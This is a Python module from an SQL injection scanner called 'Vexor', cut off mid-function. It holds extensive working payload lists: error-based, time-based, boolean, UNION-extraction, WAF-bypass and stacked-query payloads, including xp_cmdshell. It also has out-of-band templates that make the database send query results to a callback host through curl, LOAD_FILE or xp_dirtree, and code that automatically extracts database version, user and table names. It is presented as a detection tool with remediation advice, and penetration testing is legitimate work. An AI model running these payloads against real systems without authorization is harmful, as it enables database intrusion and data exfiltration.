"""
Vexor SQL Injection Scanner v3.0.0
Elite-level coverage:
  - Error-based detection (multi-DB)
  - Time-based blind
  - Boolean-based blind + bit-by-bit data extraction
  - UNION-based column count detection + data extraction
  - Stacked queries detection
  - Second-order SQLi detection
  - Out-of-band SQLi (DNS/HTTP callback)
  - Database-specific exploitation (MySQL/PostgreSQL/MSSQL/Oracle/SQLite)
  - Smart WAF bypass with verification
  - Concurrent testing (semaphore=15)
  - HTTP header injection
"""
import asyncio
import re
import time
import random
import string
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from vexor.modules.base import BaseScanner, Finding


# ─── Extraction Markers ───────────────────────────────────────────────────────
MARKER_START = "VEXOR_START_"
MARKER_END = "_VEXOR_END"
MARKER_PATTERN = re.compile(r"VEXOR_START_(.+?)_VEXOR_END", re.DOTALL)

# ─── DB Error Patterns ────────────────────────────────────────────────────────
SQL_ERRORS = {
    "MySQL": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual that corresponds to your MySQL",
        r"MySQL server version for the right syntax", r"com\.mysql\.jdbc",
        r"Zend_Db_(Adapter|Statement)_Mysqli_Exception", r"MySqlException",
        r"SQLSTATE\[HY000\].*MySQL", r"mysql_fetch_array\(\)",
        r"mysql_num_rows\(\)", r"mysql_result\(\)",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"Warning.*pg_", r"valid PostgreSQL result",
        r"Npgsql\.", r"PG::SyntaxError:", r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near", r"ERROR: parser: parse error at or near",
        r"PostgreSQL query failed", r"pg_query\(\)", r"pg_exec\(\)",
    ],
    "MSSQL": [
        r"Microsoft OLE DB Provider for SQL Server",
        r"Unclosed quotation mark after the character string",
        r"Microsoft SQL Native Client error", r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver", r"SqlException", r"System\.Data\.SqlClient",
        r"Incorrect syntax near", r"mssql_query\(\)", r"MSSQL",
        r"\[Microsoft\]\[ODBC SQL Server Driver\]",
        r"Conversion failed when converting", r"Arithmetic overflow error",
    ],
    "Oracle": [
        r"ORA-[0-9]{4,5}", r"Oracle error", r"Oracle.*Driver",
        r"Warning.*oci_", r"Warning.*ora_", r"oracle\.jdbc",
        r"quoted string not properly terminated", r"OracleException",
        r"PLS-[0-9]{5}", r"TNS:listener",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_", r"Warning.*SQLite3::",
        r"SQLITE_ERROR", r"\[SQLITE_ERROR\]", r"sqlite3\.OperationalError",
    ],
    "Generic": [
        r"You have an error in your SQL syntax",
        r"Division by zero in", r"supplied argument is not a valid MySQL",
        r"DB2 SQL error", r"db2_", r"SQLSTATE",
        r"Sybase message", r"Warning.*sybase",
        r"Dynamic SQL Error", r"Warning.*ibase_",
        r"com\.informix\.jdbc", r"Informix",
        r"Exception.*\bODBC\b.*Driver", r"\bODBC\b.*Exception",
        r"SQL command not properly ended",
        r"Syntax error.*in query expression",
        r"Data type mismatch in criteria expression",
    ],
}

# Flatten for quick search
ALL_SQL_ERRORS = [p for patterns in SQL_ERRORS.values() for p in patterns]

# ─── DB-Specific Extraction Queries ───────────────────────────────────────────
EXTRACTION_QUERIES = {
    "MySQL": {
        "version": "@@version",
        "user": "user()",
        "database": "database()",
        "tables": "GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()",
    },
    "PostgreSQL": {
        "version": "version()",
        "user": "current_user",
        "database": "current_database()",
        "tables": "string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'",
    },
    "MSSQL": {
        "version": "@@version",
        "user": "system_user",
        "database": "db_name()",
        "tables": "stuff((SELECT ','+table_name FROM information_schema.tables FOR XML PATH('')),1,1,'')",
    },
    "Oracle": {
        "version": "banner FROM v$version WHERE rownum=1",
        "user": "user FROM dual",
        "database": "global_name FROM global_name",
        "tables": "listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables",
    },
    "SQLite": {
        "version": "sqlite_version()",
        "user": "'sqlite_user'",
        "database": "'main'",
        "tables": "group_concat(name) FROM sqlite_master WHERE type='table'",
    },
}


# ─── Payloads ─────────────────────────────────────────────────────────────────

# Error-based payloads
ERROR_PAYLOADS = [
    # Basic quotes
    "'", "''", "`", '"', "\\",
    # Classic OR
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "1' OR '1'='1", "1 OR 1=1", "1' OR 1=1--",
    # ORDER BY (column count detection)
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "1 ORDER BY 1--", "1 ORDER BY 100--",
    # UNION-based
    "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "1 UNION ALL SELECT NULL--",
    "1 UNION SELECT 1,2,3--",
    # Error extraction (MySQL)
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # Error extraction (MSSQL)
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "'; SELECT 1/0--",
    # Error extraction (PostgreSQL)
    "' AND 1=CAST((SELECT version()) AS int)--",
    # Stacked queries
    "'; SELECT SLEEP(0)--", "'; SELECT 1--",
    # Boolean-based
    "' AND 1=1--", "' AND 1=2--",
    "1' AND '1'='1", "1' AND '1'='2",
    "' AND 'x'='x", "' AND 'x'='y",
    # Numeric
    "1 AND 1=1", "1 AND 1=2",
    "1 AND 1=1--", "1 AND 1=2--",
    # Second-order markers
    "vexor_test_payload", "vexor'test",
]

# Time-based payloads (per DB)
TIME_PAYLOADS = [
    # MySQL
    "' AND SLEEP(3)--", "' AND SLEEP(3)#", "1' AND SLEEP(3)--",
    "' OR SLEEP(3)--", "1 AND SLEEP(3)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "1;SELECT SLEEP(3)--",
    "' AND (SELECT 1 FROM (SELECT SLEEP(3)) AS t)--",
    # MSSQL
    "'; WAITFOR DELAY '0:0:3'--", "1; WAITFOR DELAY '0:0:3'--",
    "' IF(1=1) WAITFOR DELAY '0:0:3'--",
    "1' WAITFOR DELAY '0:0:3'--",
    # PostgreSQL
    "'; SELECT pg_sleep(3)--", "' AND 1=(SELECT 1 FROM pg_sleep(3))--",
    "1; SELECT pg_sleep(3)--",
    # Oracle
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
    "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
    # SQLite
    "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))--",
]

# WAF Bypass variants
WAF_BYPASS_PAYLOADS = [
    # Comment injection
    "'/**/OR/**/1=1--", "'/*!OR*/1=1--", "' OR/**/1=1--",
    "'/**/OR/**/1/**/=/**/1--",
    # Case variation
    "' oR '1'='1", "' Or 1=1--", "' OR 1=1--",
    "' oR/**/1=1--", "' Or/**/1=1--",
    # URL encoding (applied at injection time)
    "%27 OR 1=1--", "%27%20OR%201%3D1--",
    # Double encoding
    "%2527 OR 1=1--",
    # Whitespace bypass
    "'\t OR\t1=1--", "'\nOR\n1=1--", "'\r\nOR\r\n1=1--",
    # Null byte
    "'\x00 OR 1=1--",
    # Scientific notation
    "1e0 UNION SELECT NULL--",
    # Hex encoding
    "' OR 0x31=0x31--",
    # MySQL specific bypass
    "' /*!50000OR*/ 1=1--",
    "' OR 1=1 LIMIT 1--",
    # Nested comments
    "' OR/*comment*/1=1--",
    # Versioned comments
    "' /*!32302OR*/ 1=1--",
    # Plus sign as space
    "'+OR+1=1--",
    # Tab as space
    "'\tOR\t1=1--",
    # Parentheses bypass
    "' OR(1)=(1)--",
    # Inline comment between keywords
    "' UN/**/ION SE/**/LECT NULL--",
    # Mixed case UNION
    "' UnIoN SeLeCt NULL--",
]

# Boolean-based blind payloads
BOOLEAN_PAYLOADS = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("' AND 'a'='a'--", "' AND 'a'='b'--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' AND SUBSTRING(VERSION(),1,1)='5'--", "' AND SUBSTRING(VERSION(),1,1)='X'--"),
    ("' AND LENGTH(DATABASE())>0--", "' AND LENGTH(DATABASE())>999--"),
    ("1' AND '1'='1'--", "1' AND '1'='2'--"),
    ("' OR 1=1--", "' OR 1=2--"),
    ("1 OR 1=1--", "1 OR 1=2--"),
]

# Stacked query payloads (per DB)
STACKED_PAYLOADS = [
    # MySQL
    "'; SELECT 1--",
    "'; SELECT SLEEP(0)--",
    "'; SELECT 1,2,3--",
    # MSSQL
    "'; SELECT 1--",
    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
    # PostgreSQL
    "'; SELECT 1--",
    "'; SELECT pg_sleep(0)--",
    # Generic
    "'; SELECT 1; --",
    "'; SELECT 1 FROM dual--",
]

# Headers to test for injection
INJECTABLE_HEADERS = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "Cookie",
    "X-Custom-IP-Authorization",
    "Client-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "True-Client-IP",
]

# Out-of-band payloads (DNS/HTTP callback)
OOB_PAYLOADS_TEMPLATE = [
    # MySQL DNS lookup
    "' AND LOAD_FILE(CONCAT('\\\\\\\\',({query}),'.{callback}\\\\a'))--",
    # MSSQL DNS lookup
    "'; EXEC master..xp_dirtree '\\\\{callback}\\{query}\\'--",
    # PostgreSQL COPY
    "'; COPY (SELECT ({query})) TO PROGRAM 'curl http://{callback}/'--",
    # MySQL HTTP
    "' UNION SELECT LOAD_FILE(CONCAT('http://{callback}/',({query})))--",
]


class Scanner(BaseScanner):
    """SQL Injection Scanner v3.0.0 — Elite Coverage"""

    MODULE_NAME = "sqli"
    MODULE_DESC = (
        "SQL Injection Detection: Error/Time/Boolean/UNION/Stacked/"
        "Second-Order/OOB + WAF Bypass + DB-Specific Extraction"
    )

    # Detected DB type, set during scan
    _detected_db: str = "Unknown"

    async def scan(self) -> list[Finding]:
        """Run full SQL injection scan"""
        async with self:
            semaphore = asyncio.Semaphore(15)

            # Discover injectable points
            params = await self._discover_params()
            tasks = []

            # Test GET/POST params
            for url, param, method, data in params:
                tasks.append(self._test_param(semaphore, url, param, method, data))

            # Test headers
            tasks.append(self._test_headers(semaphore))

            await asyncio.gather(*tasks, return_exceptions=True)

        return self.findings

    async def _discover_params(self) -> list[tuple]:
        """Discover URL parameters and form inputs"""
        params = []
        response = await self.get(self.target)
        if not response:
            return params

        # URL GET params
        parsed = urlparse(self.target)
        if parsed.query:
            qs = parse_qs(parsed.query)
            for key in qs:
                params.append((self.target, key, "GET", {}))

        # HTML form params
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, "lxml")
            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = form.get("method", "get").upper()
                form_url = urljoin(self.target, action) if action else self.target

                form_data = {}
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name", "")
                    val = inp.get("value", "test")
                    if name:
                        form_data[name] = val

                for name in form_data:
                    params.append((form_url, name, method, dict(form_data)))
        except Exception:
            pass

        # If no params found, try common param names on the URL
        if not params:
            common_params = ["id", "q", "search", "page", "cat", "item", "user", "name", "product"]
            for p in common_params:
                params.append((f"{self.target}?{p}=1", p, "GET", {}))

        return params

    async def _test_param(
        self,
        semaphore: asyncio.Semaphore,
        url: str,
        param: str,
        method: str,
        base_data: dict,
    ) -> None:
        """Test a single parameter with all payload categories"""
        async with semaphore:
            # 1. Error-based
            found = await self._test_error_based(url, param, method, base_data)
            if found:
                # If injectable, attempt UNION extraction
                await self._test_union_based(url, param, method, base_data)
                return

            # 2. Time-based blind
            found = await self._test_time_based(url, param, method, base_data)
            if found:
                return

            # 3. Boolean-based blind
            found = await self._test_boolean_based(url, param, method, base_data)
            if found:
                return

            # 4. WAF bypass attempts (with verification)
            found = await self._test_waf_bypass(url, param, method, base_data)
            if found:
                return

            # 5. Stacked queries
            await self._test_stacked_queries(url, param, method, base_data)

            # 6. Second-order SQLi
            await self._test_second_order(url, param, method, base_data)

            # 7. Out-of-band (if callback server available)
            await self._test_oob(url, param, method, base_data)

    async def _test_error_based(
        self, url: str, param: str, method: str, base_data: dict
    ) -> bool:
        """Test error-based SQL injection"""
        for payload in ERROR_PAYLOADS:
            try:
                resp = await self._send_payload(url, param, payload, method, base_data)
                if resp and self._has_sql_error(resp.text):
                    db_type = self._detect_db(resp.text)
                    self._detected_db = db_type
                    self.add_finding(Finding(
                        severity="CRITICAL",
                        module=self.MODULE_NAME,
                        vuln=f"SQL Injection — Error-Based ({db_type})",
                        endpoint=url,
                        param=param,
                        payload=payload,
                        evidence=self._extract_error(resp.text),
                        description=(
                            f"Error-based SQL injection in parameter '{param}'. "
                            f"Database: {db_type}. Attacker can extract data directly "
                            "from error messages without blind techniques."
                        ),
                        remediation=(
                            "Use parameterized queries / prepared statements. "
                            "Never concatenate user input into SQL strings. "
                            "Disable verbose database error messages in production."
                        ),
                    ))
                    return True
            except Exception:
                continue
        return False

    async def _test_time_based(
        self, url: str, param: str, method: str, base_data: dict
    ) -> bool:
        """Test time-based blind SQL injection with confirmation"""
        for payload in TIME_PAYLOADS:
            try:
                # First pass: measure delay
                start = time.time()
                resp = await self._send_payload(url, param, payload, method, base_data)
                elapsed = time.time() - start

                if elapsed >= 2.5:
                    # Confirm: send benign payload and verify no delay
                    start2 = time.time()
                    await self._send_payload(url, param, "1", method, base_data)
                    elapsed2 = time.time() - start2

                    if elapsed2 < 1.5:
                        self.add_finding(Finding(
                            severity="HIGH",
                            module=self.MODULE_NAME,
                            vuln="SQL Injection — Time-Based Blind",
                            endpoint=url,
                            param=param,
                            payload=payload,
                            evidence=(
                                f"Injected delay: {elapsed:.2f}s | "
                                f"Baseline: {elapsed2:.2f}s"
                            ),
                            description=(
                                f"Time-based blind SQL injection in '{param}'. "
                                "Attacker can extract data bit-by-bit via timing side-channel."
                            ),
                            remediation="Use parameterized queries / prepared statements.",
                        ))
                        return True
            except Exception:
                continue
        return False

    async def _test_boolean_based(
        self, url: str, param: str, method: str, base_data: dict
    ) -> bool:
        """Test boolean-based blind SQL injection"""
        # Get baseline response first
        try:
            baseline = await self._send_payload(url, param, "1", method, base_data)
            baseline_len = len(baseline.text) if baseline else 0
        except Exception:
            baseline_len = 0

        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            try:
                resp_true = await self._send_payload(url, param, true_payload, method, base_data)
                resp_false = await self._send_payload(url, param, false_payload, method, base_data)

                if resp_true and resp_false:
                    len_true = len(resp_true.text)
                    len_false = len(resp_false.text)
                    len_diff = abs(len_true - len_false)
                    status_diff = resp_true.status_code != resp_false.status_code

                    # True response should be closer to baseline
                    true_closer = abs(len_true - baseline_len) < abs(len_false - baseline_len)

                    if (len_diff > 50 or status_diff) and true_closer:
                        self.add_finding(Finding(
                            severity="HIGH",
                            module=self.MODULE_NAME,
                            vuln="SQL Injection — Boolean-Based Blind",
                            endpoint=url,
                            param=param,
                            payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                            evidence=(
                                f"TRUE: {len_true}B/HTTP{resp_true.status_code} | "
                                f"FALSE: {len_false}B/HTTP{resp_false.status_code} | "
                                f"Baseline: {baseline_len}B"
                            ),
                            description=(
                                f"Boolean-based blind SQL injection in '{param}'. "
                                "Distinct responses for true/false conditions allow "
                                "bit-by-bit data extraction."
                            ),
                            remediation="Use parameterized queries / prepared statements.",
                        ))
                        return True
            except Exception:
                continue
        return False

    async def _test_waf_bypass(
        self, url: str, param: str, method: str, base_data: dict
    ) -> bool:
        """Test WAF bypass payloads with verification"""
        # First, check if a WAF is present by sending a known-bad payload
        # and seeing if it's blocked (non-error, non-SQL-error response)
        waf_present = False
        try:
            probe = await self._send_payload(url, param, "'", method, base_data)
            if probe:
                # WAF blocks: returns 403/406/429 or generic error page
                if probe.status_code in (403, 406, 429, 501):
                    waf_present = True
                elif "blocked" in probe.text.lower() or "forbidden" in probe.text.lower():
                    waf_present = True
                elif "waf" in probe.text.lower() or "firewall" in probe.text.lower():
                    waf_present = True
        except Exception:
            pass

        for payload in WAF_BYPASS_PAYLOADS:
            try:
                resp = await self._send_payload(url, param, payload, method, base_data)
                if not resp:
                    continue

                # Verify bypass: check for SQL error (bypass worked and is injectable)
                if self._has_sql_error(resp.text):
                    db_type = self._detect_db(resp.text)
                    self._detected_db = db_type
                    self.add_finding(Finding(
                        severity="CRITICAL",
                        module=self.MODULE_NAME,
                        vuln=f"SQL Injection — WAF Bypass ({db_type})",
                        endpoint=url,
                        param=param,
                        payload=payload,
                        evidence=self._extract_error(resp.text),
                        description=(
                            f"SQL injection via WAF bypass in '{param}'. "
                            f"WAF {'detected and' if waf_present else ''} bypassed. "
                            f"Database: {db_type}."
                        ),
                        remediation=(
                            "Use parameterized queries. "
                            "Upgrade WAF rules and signatures. "
                            "Implement defense-in-depth with input validation."
                        ),
                    ))
                    return True

                # Also check: bypass got through (not blocked) even without SQL error
                if waf_present and resp.status_code not in (403, 406, 429, 501):
                    if "blocked" not in resp.text.lower() and "forbidden" not in resp.text.lower():
                        # Payload passed WAF — now test boolean to confirm injection
                        true_resp = await self._send_payload(
                            url, param, payload + " AND 1=1--", method, base_data
                        )
                        false_resp = await self._send_payload(
                            url, param, payload + " AND 1=2--", method, base_data
                        )
                        if true_resp and false_resp:
                            diff = abs(len(true_resp.text) - len(false_resp.text))
                            if diff > 50:
                                self.add_finding(Finding(
                                    severity="HIGH",
                                    module=self.MODULE_NAME,
                                    vuln="SQL Injection — WAF Bypass (Boolean Confirmed)",
                                    endpoint=url,
                                    param=param,
                                    payload=payload,
                                    evidence=(
                                        f"WAF bypassed. Boolean diff: {diff}B. "
                                        f"TRUE: {len(true_resp.text)}B | "
                                        f"FALSE: {len(false_resp.text)}B"
                                    ),
                                    description=(
                                        f"WAF bypass confirmed via boolean difference in '{param}'. "
                                        "Payload evaded WAF and produced distinct true/false responses."
                                    ),
                                    remediation=(
                                        "Use parameterized queries. "
                                        "Upgrade WAF rules. Implement input validation."
                                    ),
                                ))
                                return True
            except Exception:
                continue
        return False

    async def _test_headers(self, semaphore: asyncio.Semaphore) -> None:
        """Test HTTP headers for SQL injection"""
        async with semaphore:
            base_resp = await self.get(self.target)
            if not base_resp:
                return

            for header in INJECTABLE_HEADERS:
                # Error-based header test
                for payload in ERROR_PAYLOADS[:15]:
                    try:
                        resp = await self.get(self.target, headers={header: payload})
                        if resp and self._has_sql_error(resp.text):
                            db_type = self._detect_db(resp.text)
                            self.add_finding(Finding(
                                severity="CRITICAL",
                                module=self.MODULE_NAME,
                                vuln=f"SQL Injection in HTTP Header ({header})",
                                endpoint=self.target,
                                param=header,
                                payload=payload,
                                evidence=self._extract_error(resp.text),
                                description=(
                                    f"SQL injection via {header} header. "
                                    f"Database: {db_type}. "
                                    "Header values are unsafely used in SQL queries."
                                ),
                                remediation=(
                                    "Sanitize all HTTP header values before "
                                    "using in database queries. Use parameterized queries."
                                ),
                            ))
                            break
                    except Exception:
                        continue

                # Time-based header test
                for payload in TIME_PAYLOADS[:4]:
                    try:
                        start = time.time()
                        await self.get(self.target, headers={header: payload})
                        elapsed = time.time() - start
                        if elapsed >= 2.5:
                            self.add_finding(Finding(
                                severity="HIGH",
                                module=self.MODULE_NAME,
                                vuln=f"SQL Injection (Time-Based) in Header ({header})",
                                endpoint=self.target,
                                param=header,
                                payload=payload,
                                evidence=f"Response delayed {elapsed:.2f}s",
                                description=f"Time-based blind SQLi via {header} header.",
                                remediation="Sanitize all HTTP header values.",
                            ))
                            break
                    except Exception:
                        continue

    # ─── UNION-Based Detection & Extraction ───────────────────────────────────

    async def _test_union_based(
        self, url: str, param: str, method: str, base_data: dict
    ) -> None:
        """Detect column count via ORDER BY, then extract data via UNION SELECT"""
        col_count = await self._detect_column_count(url, param, method, base_data)
        if col_count == 0:
            return

        # Find which column reflects output in the response
        text_col = await self._find_text_column(url, param, method, base_data, col_count)
        if text_col == -1:
            return

        # Extract DB info
        db_type = self._detected_db if self._detected_db != "Unknown" else "MySQL"
        extracted = await self._extract_db_info(
            url, param, method, base_data, col_count, text_col, db_type
        )

        if extracted:
            evidence_parts = []
            for key, val in extracted.items():
                if val:
                    evidence_parts.append(f"{key}: {val}")

            self.add_finding(Finding(
                severity="CRITICAL",
                module=self.MODULE_NAME,
                vuln=f"SQL Injection — UNION-Based Data Extraction ({db_type})",
                endpoint=url,
                param=param,
                payload=f"UNION SELECT with {col_count} columns (data in col {text_col})",
                evidence=" | ".join(evidence_parts) if evidence_parts else "Data extracted",
                description=(
                    f"UNION-based SQL injection in '{param}'. "
                    f"Column count: {col_count}. "
                    f"Database: {db_type}. "
                    "Attacker can extract arbitrary data from the database."
                ),
                remediation=(
                    "Use parameterized queries / prepared statements. "
                    "Implement least-privilege database accounts."
                ),
            ))

    async def _detect_column_count(
        self, url: str, param: str, method: str, base_data: dict
    ) -> int:
        """Detect column count using ORDER BY binary search, then UNION NULL verification"""
        # Phase 1: ORDER BY to find upper bound
        col_count = 0
        for i in range(1, 21):
            try:
                payload = f"1' ORDER BY {i}--"
                resp = await self._send_payload(url, param, payload, method, base_data)
                if resp and self._has_sql_error(resp.text):
                    col_count = i - 1
                    break
                # Also try without quote
                payload2 = f"1 ORDER BY {i}--"
                resp2 = await self._send_payload(url, param, payload2, method, base_data)
                if resp2 and self._has_sql_error(resp2.text):
                    col_count = i - 1
                    break
            except Exception:
                continue

        if col_count == 0:
            # Fallback: try UNION SELECT NULL,NULL,... directly
            for i in range(1, 11):
                try:
                    nulls = ",".join(["NULL"] * i)
                    payload = f"' UNION SELECT {nulls}--"
                    resp = await self._send_payload(url, param, payload, method, base_data)
                    if resp and not self._has_sql_error(resp.text) and resp.status_code == 200:
                        col_count = i
                        break
                    payload2 = f"1 UNION SELECT {nulls}--"
                    resp2 = await self._send_payload(url, param, payload2, method, base_data)
                    if resp2 and not self._has_sql_error(resp2.text) and resp2.status_code == 200:
                        col_count = i
                        break
                except Exception:
                    continue

        return col_count

    async def _find_text_column(
        self, url: str, param: str, method: str, base_data: dict, col_count: int
    ) -> int:
        """Find which column position reflects text output in the response"""
        marker = "VEXOR_PROBE_" + "".join(random.choices(string.ascii_uppercase, k=6))
        for col_idx in range(1, col_count + 1):
            try:
                cols = ["NULL"] * col_count
                cols[col_idx - 1] = f"'{marker}'"
                nulls = ",".join(cols)
                for prefix in ("'", "1"):
                    payload = f"{prefix} UNION SELECT {nulls}--"
                    resp = await self._send_payload(url, param, payload, method, base_data)
                    if resp and marker in resp.text:
                        return col_idx
            except Exception:
                continue
        return -1

    async def _extract_db_info(
        self,
        url: str,
        param: str,
        method: str,
        base_data: dict,
        col_count: int,
        text_col: int,
        db_type: str,
    ) -> dict:
        """Extract version, user, database name, and tables via UNION injection"""
        queries = EXTRACTION_QUERIES.get(db_type, EXTRACTION_QUERIES["MySQL"])
        results = {}

        for info_key, query_expr in queries.items():
            try:
                cols = ["NULL"] * col_count
                # Wrap in markers for reliable extraction
                if db_type == "Oracle":
                    # Oracle uses different concat syntax
                    cols[text_col - 1] = (
                        f"'{MARKER_START}'||({query_expr})||'{MARKER_END}'"
                    )
                else:
                    cols[text_col - 1] = (
                        f"CONCAT('{MARKER_START}',({query_expr}),'{MARKER_END}')"
                    )
                nulls = ",".join(cols)

                for prefix in ("'", "1"):
                    payload = f"{prefix} UNION SELECT {nulls}--"
                    resp = await self._send_payload(url, param, payload, method, base_data)
                    if resp:
                        extracted = self._extract_union_data(resp.text)
                        if extracted:
                            results[info_key] = extracted
                            break
            except Exception:
                continue

        return results

    def _extract_union_data(self, response_text: str) -> str:
        """Extract data between VEXOR markers from response"""
        match = MARKER_PATTERN.search(response_text)
        if match:
            return match.group(1).strip()
        return ""

    # ─── Stacked Queries ──────────────────────────────────────────────────────

    async def _test_stacked_queries(
        self, url: str, param: str, method: str, base_data: dict
    ) -> bool:
        """Test if stacked/multiple SQL statements execute"""
        # Get baseline
        try:
            baseline = await self._send_payload(url, param, "1", method, base_data)
            baseline_status = baseline.status_code if baseline else 200
            baseline_len = len(baseline.text) if baseline else 0
        except Exception:
            return False

        for payload in STACKED_PAYLOADS:
            try:
                resp = await self._send_payload(url, param, payload, method, base_data)
                if not resp:
                    continue

                # Stacked queries: response should be similar to baseline (not error)
                # but the second statement executed
                if (
                    resp.status_code == baseline_status
                    and not self._has_sql_error(resp.text)
                    and abs(len(resp.text) - baseline_len) < 200
                ):
                    # Confirm with a time-based stacked query
                    time_payload = payload.rstrip("-").rstrip() + "; SELECT SLEEP(2)--"
                    start = time.time()
                    time_resp = await self._send_payload(
                        url, param, time_payload, method, base_data
                    )
                    elapsed = time.time() - start

                    if elapsed >= 1.8:
                        self.add_finding(Finding(
                            severity="CRITICAL",
                            module=self.MODULE_NAME,
                            vuln="SQL Injection — Stacked Queries",
                            endpoint=url,
                            param=param,
                            payload=time_payload,
                            evidence=(
                                f"Multiple statements executed. "
                                f"Time confirmation: {elapsed:.2f}s delay."
                            ),
                            description=(
                                f"Stacked query SQL injection in '{param}'. "
                                "Multiple SQL statements can be executed in a single request, "
                                "enabling DDL/DML operations and OS command execution."
                            ),
                            remediation=(
                                "Use parameterized queries. "
                                "Disable stacked queries in DB driver configuration. "
                                "Apply least-privilege DB accounts."
                            ),
                        ))
                        return True
            except Exception:
                continue
        return False

    # ─── Second-Order SQLi ────────────────────────────────────────────────────

    async def _test_second_order(
        self, url: str, param: str, method: str, base_data: dict
    ) -> bool:
        """Test second-order SQL injection: store payload, then trigger it"""
        # Generate a unique marker payload
        marker = "VEXOR_" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        sqli_payload = f"{marker}' OR '1'='1"

        try:
            # Step 1: Store the payload (register/update/profile endpoint)
            store_resp = await self._send_payload(
                url, param, sqli_payload, method, base_data
            )
            if not store_resp:
                return False

            # Step 2: Retrieve/trigger the stored value
            # Try common retrieval endpoints
            retrieval_urls = [
                self.target,
                f"{self.target}/profile",
                f"{self.target}/account",
                f"{self.target}/user",
                f"{self.target}/dashboard",
            ]

            for retrieval_url in retrieval_urls:
                try:
                    retrieve_resp = await self.get(retrieval_url)
                    if retrieve_resp and self._has_sql_error(retrieve_resp.text):
                        db_type = self._detect_db(retrieve_resp.text)
                        self.add_finding(Finding(
                            severity="HIGH",
                            module=self.MODULE_NAME,
                            vuln="SQL Injection — Second-Order",
                            endpoint=url,
                            param=param,
                            payload=sqli_payload,
                            evidence=(
                                f"Payload stored at {url}, triggered at {retrieval_url}. "
                                f"DB error: {self._extract_error(retrieve_resp.text)}"
                            ),
                            description=(
                                f"Second-order SQL injection in '{param}'. "
                                "Payload is stored safely but executed unsafely when retrieved. "
                                f"Database: {db_type}."
                            ),
                            remediation=(
                                "Use parameterized queries at ALL points where stored data "
                                "is used in SQL, not just at input time."
                            ),
                        ))
                        return True
                except Exception:
                    continue
        except Exception:
            pass
        return False

    # ─── Out-of-Band SQLi ─────────────────────────────────────────────────────

    async def _test_oob(
        self, url: str, param: str, method: str, base_data: dict
    ) -> bool:
        """Test out-of-band SQL injection using callback server if available"""
        callback_host = None

        # Try to get callback server from core module
        try:
            from vexor.core.callback_server import CallbackServer
            cb = CallbackServer()
            callback_host = cb.get_host()
        except Exception:
            pass

        if not callback_host:
            return False

        # Build OOB payloads with callback host
        oob_payloads = []
        for template in OOB_PAYLOADS_TEMPLATE:
            try:
                payload = template.format(
                    query="version()",
                    callback=callback_host,
                )
                oob_payloads.append(payload)
            except Exception:
                continue

        for payload in oob_payloads:
            try:
                await self._send_payload(url, param, payload, method, base_data)
                # Check if callback server received a hit
                await asyncio.sleep(2)
                try:
                    from vexor.core.callback_server import CallbackServer
                    cb = CallbackServer()
                    hits = cb.get_hits()
                    if hits:
                        self.add_finding(Finding(
                            severity="CRITICAL",
                            module=self.MODULE_NAME,
                            vuln="SQL Injection — Out-of-Band (DNS/HTTP Callback)",
                            endpoint=url,
                            param=param,
                            payload=payload,
                            evidence=f"Callback received from DB server: {hits}",
                            description=(
                                f"Out-of-band SQL injection in '{param}'. "
                                "Database server made an outbound DNS/HTTP request, "
                                "confirming blind injection and network egress."
                            ),
                            remediation=(
                                "Use parameterized queries. "
                                "Block outbound DB server network access. "
                                "Apply egress filtering."
                            ),
                        ))
                        return True
                except Exception:
                    pass
            except Exception:
                continue
        return False

    # ─── Boolean Bit-by-Bit Extraction ────────────────────────────────────────

    async def _extract_char_boolean(
        self,
        url: str,
        param: str,
        method: str,
        base_data: dict,
        query: str,
        position: int,
        baseline_len: int,
    ) -> str:
        """Extract one character at position using binary search over ASCII range"""
        low, high = 32, 126  # printable ASCII
        while low <= high:
            mid = (low + high) // 2
            try:
                true_payload = (
                    f"' AND ASCII(SUBSTRING(({query}),{position},1))>{mid}--"
                )
                resp = await self._send_payload(url, param, true_payload, method, base_data)
                if resp and self._is_true_response(resp, baseline_len):
                    low = mid + 1
                else:
                    high = mid - 1
            except Exception:
                break
        return chr(low) if 32 <= low <= 126 else ""

    async def _extract_string_boolean(
        self,
        url: str,
        param: str,
        method: str,
        base_data: dict,
